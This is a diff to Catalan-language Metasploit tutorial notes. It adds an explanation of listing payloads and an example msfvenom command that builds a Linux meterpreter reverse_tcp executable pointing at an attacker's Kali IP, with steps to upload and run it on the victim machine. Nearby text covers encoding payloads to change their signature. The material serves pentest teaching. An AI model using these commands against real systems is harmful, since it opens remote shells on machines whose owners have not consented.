@@ -1003,6 +1003,8 @@ msf  exploit(<strong><span style="color: crimson;">auxiliary/scanner/smb/smb_ver
   
    <p>Comprovar si és vulnerable (sense atacar). Molt important i sovint obligatori:</p>
   <pre>check</pre>
+    <p>Altra opció molt útil és poder saber quins PAYLOADS hi ha per a un exploit. Una vegada explotat, i abans de llançar l'exploit...</p>
+    <pre>SHOW PAYLOADS</pre>
 
       <p>Metasploit NO substitueix Nmap ni un escàner de vulnerabilitats complet (com Nessus).
          Metasploit pot detectar possibles vulnerabilitats, però ho fa amb mòduls concrets, no amb un escaneig global automàtic.</p>
@@ -1040,9 +1042,19 @@ hosts    </pre>
     <p>3. Encoders (ofuscació)</p> Ofuscar el payload, Canviar la seua signatura
     <p>4. Format d’eixida</p>  El payload pot generar-se com: Un executable, Un script, Una llibreria, Codi brut (shellcode)
     <p>Tot i això, no s’executa sol: cal una vulnerabilitat o una execució manual.</p>
+      <pre>Exemple de creació de payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=4444 -f elf > meterpreter.elf        </pre>
+  <p>Este payload s'haurà de pujar a la maq víctima i executar</p>
+  <pre>chmod +x meterpreter.elf
+./meterpreter.elf  </pre>
+
     <hr><p>Una altra eina del framework de metasploit es <code>msfupdate</code>, que permet: Actualitzar Metasploit i Afegir nous mòduls i correccions</p>
     <pre>msfupdate</pre>
+
+
     </section>             
+
+
 
     <section id="ad">
     <h1>Atacs empresarials (Active Directory)</h1>
